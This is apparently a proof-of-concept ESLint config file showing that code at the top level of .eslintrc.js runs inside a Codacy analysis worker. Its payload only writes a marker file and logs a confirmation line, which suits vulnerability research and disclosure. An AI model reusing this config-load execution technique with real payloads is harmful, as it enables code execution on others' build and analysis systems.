// PoC payload — benign marker only. RCE via codacy-eslint loading the repo's .eslintrc.js via require().
// ESLint loads .eslintrc.js by require()-ing it; top-level code runs during config load inside the Codacy worker.
const fs = require("fs");
const marker = "/tmp/codacy-eslint-rce-confirmed.txt";
const body = "RCE confirmed via .eslintrc.js load. cwd=" + __dirname + "\n";
try {
  fs.writeFileSync(marker, body);
  console.log("CODEX-RCE-MARKER-ESLINT " + __dirname + " " + marker);
} catch (e) {
  console.log("CODEX-RCE-MARKER-ESLINT-ERR " + e.message);
}
module.exports = { root: true, rules: {} };
